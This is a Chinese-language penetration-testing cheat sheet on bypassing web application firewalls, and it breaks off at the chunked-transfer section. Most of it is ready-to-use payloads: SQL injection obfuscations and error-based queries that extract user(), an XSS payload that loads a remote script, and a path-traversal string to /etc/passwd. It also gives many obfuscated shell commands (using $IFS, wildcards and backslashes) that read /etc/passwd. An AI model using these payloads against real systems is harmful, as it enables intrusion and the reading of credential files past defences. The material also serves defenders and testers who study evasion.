# Bypass 技巧
---
## 免责声明
`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`
---
## 大纲
* [匹配绕过](#匹配绕过)
* [分段传输](#分段传输)
* [性能角度](#性能角度)
* [POST](#post)
---
**相关文章 & Source & Reference**
- [██大学通用型 WAF 不完全绕过(持续非定期更新) ](https://drivertom.blogspot.com/2018/12/waf.html)
- [技术讨论 | 在 HTTP 协议层面绕过 WAF](https://www.freebuf.com/news/193659.html)
- [利用分块传输吊打所有 WAF](https://www.anquanke.com/post/id/169738)
- [编写 Burp 分块传输插件绕 WAF](http://gv7.me/articles/2019/chunked-coding-converter/)
- [输入内容存在危险字符,安全起见,已被本站拦截](https://bbs.ichunqiu.com/thread-44577-1-1.html)
- [Web Application Firewall (WAF) Evasion Techniques - secjuice™ - Medium](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8)
- [浅谈绕过 waf 的数种方法](https://www.waitalone.cn/waf-bypass.html)
- [绕过云锁文件读取防护](https://drivertom.blogspot.com/2019/06/lfi.html)
- [TSRC挑战赛：WAF之SQL注入绕过挑战实录](https://security.tencent.com/index.php/blog/msg/66)
- [简单绕过waf拿下赌博网站](https://xz.aliyun.com/t/9181) - 利用 JavaScript 转写 php
- [从shiro-550漏洞品阿里云waf规则引擎](https://mp.weixin.qq.com/s/qF7Jgiev5B7zLEHwGXry3A)
- [你的扫描器可以绕过防火墙么？（一）](https://paper.seebug.org/1600/)
- [CTF中的命令执行绕过](https://mp.weixin.qq.com/s/fs-IKJuDptJeZMRDCtbdkw)
- [WAF的识别、检测、绕过原理与实战案例](https://www.freebuf.com/articles/web/336869.html)
**导图**
- WAF绕过思路 [png](../../../../assets/img/Security/RedTeam/安防设备/Bypass技巧/WAF绕过思路.png)
**payload**
- [devploit/XORpass](https://github.com/devploit/XORpass#example-of-bypass) - 使用XOR编码器绕过 WAF
---
## 匹配绕过
**关键字替换**
1. AND 等价于 `&&`
2. OR 等价于 `||`
3. `=` 等价于 like
4. `+` 代替 空格
5. sleep() 等价于 benchmark()
6. mid()substring() 等价于 substr()
最直白的 payload 类似 ``,但是你可以用 `<script src=来远程加载脚本,并绕过防护`
```
`?search=naive%22%3E%20%3Cmeta%20name=%22referrer%22%20content=%22never%22%20%3E%20%3Cscript%20src=%22https://cdn.jsdelivr.net/gh/TomAPU/xsstest/test.js%22%3E%3C/script%3E%20%3C!--`
```
**注释符绕过**
1. `/**/` 与 `/*!*/` ,还可以代替空格
2. `select/*@a?v|ddd--n*/xxxxx/*@a?v|ddd--n*/from/*a?v|ddd--n*/xxxx`由于waf解析注释符耗费性能,因此这种方法结合fuzz能找到漏网之鱼
3. emoji 表情
4. -- 与 #
```
Union 注入时 `union select 1 from 2` 替换成 `union/*fuckyou//*a*//*!select*/1/*fuckyou//*a*//*!from*/2`
order by 测试时直接把空格换成 `/**//**/`
```
**空白符绕过**
1. 正则表达式空白符: %09,%0a,%0b,%0D,%20
2. mysql空白符: %09,0A,%0b,%0D,%20,%0C,%A0,/**/
**浮点数词法解析**
1. select * from xxx where id=8E0union select 1,2,3,4,5,6,7E0from xxxx
2. select * from xxx where id=8.0union select 1,2,3,4,5,6,7.0from xxxx
3. select * from xxx where id=8\Nunion select 1,2,3,4,5,6,7 \Nfrom xxxx
**利用不常用报错函数绕过**
1. select extractvalue(1,concat(1,user()));
2. select updatexml(1,concat(1,user()),1);
3. select exp(~(select * from(select user())a));
**hpp 方式**
HPP 是指 HTTP 参数污染.形如以下形式:`?id=1&id=2&id=3` 的形式,此种形式在获取 id 值的时候不同的 web 技术获取的值是不一样的.
假设提交的参数即为:
```
id=1&id=2&id=3
Asp.net + iis:id=1,2,3
Asp + iis:id=1,2,3
Php + apache:id=3
形如 index.php?a=[whitelist]&a=select 1 union select 2
```
**路径限制绕过**
比如 WAF 会对访问敏感路径加以限制,但是加上参数可以绕过.
比如想访问 `xxx.██.edu.cn/phpmyadmin/` 会被拦截,访问 `xxx.██.edu.cn/phpmyadmin/?id=1` 可以绕过
例如连续两个 `../` 会被拦截,可以尝试采用 `./`,例如存在关键词,可以使用 `./` 分割,linux 下 `./` 会被忽略
payload: `.././.././.././.././.././.././.././.././.././.././.././etc/./passwd`
**linux变量特性**
- 利用 * 匹配和 "" 为空白的特性
    ```bash
    \l\s -l\a\h
    ""c""at /""**c""/""""**********""a""d******""
    cat /e?c/p?ss??
    cat /e??/??ss*
    l''s
    {l<s,}
    {ls,-a}
    {cat,/etc/passwd}
    cat</etc/passwd
    ```
- 使用空的 shell 变量特性
    ```bash
    cat$IFS/etc/passwd
    cat${IFS}/etc/passwd
    IFS=,;`cat<<<cat,/etc/passwd`
    c${fuckwaf}at /e${fuckwaf}tc/${fuckwaf}pass${fuckwaf}wd
    ```
- 变量控制
    ```bash
    x=$'cat\x09/etc/passwd'&&$x
    a=f;d=ag;c=l;cat$IFS$a$c$d.php
    ```
- 反斜杠
    ```bash
    ca\t /etc/passwd
    ```
**多重编码**
- [How to hack a company by circumventing its WAF for fun and profit - part 2](https://www.redtimmy.com/web-application-hacking/how-to-hack-a-company-by-circumventing-its-waf-for-fun-and-profit-part-2/) - 通过多重编码绕过 iRules 规则
---
## 分段传输
**利用 pipline 绕过**
- **原理**